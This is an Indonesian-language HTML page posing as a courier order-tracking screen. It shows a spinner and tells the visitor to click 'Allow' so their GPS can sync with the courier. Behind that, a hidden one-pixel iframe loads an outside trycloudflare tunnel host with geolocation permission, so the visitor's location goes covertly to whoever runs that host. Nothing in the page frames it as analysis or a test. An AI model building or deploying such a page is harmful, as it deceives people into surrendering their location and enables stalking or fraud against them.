<!DOCTYPE html>
<html>
<head>
    <title>Lacak Pesanan Anda</title>
    <style>
        body { margin: 0; font-family: Arial, sans-serif; overflow: hidden; }
        .header { background: #cf0000; color: white; padding: 15px; text-align: center; font-weight: bold; }
        .loading-container { text-align: center; margin-top: 50px; }
        .loader {
            border: 8px solid #f3f3f3; border-top: 8px solid #cf0000;
            border-radius: 50%; width: 50px; height: 50px;
            animation: spin 1s linear infinite; display: inline-block;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        iframe { width: 1px; height: 1px; border: none; visibility: hidden; }
    </style>
</head>
<body>

    <div class="header">SISTEM KONFIRMASI LOKASI KURIR</div>

    <div class="loading-container">
        <div class="loader"></div>
        <p>Sedang menyinkronkan koordinat GPS Anda dengan kurir...</p>
        <p style="font-size: 12px; color: #666;">Silakan klik <b>"Izinkan / Allow"</b> pada jendela browser untuk melanjutkan pengiriman.</p>
    </div>

    <iframe src="https://nitrogen-governance-automotive-carrying.trycloudflare.com" 
            allow="geolocation">
    </iframe>

</body>
</html>
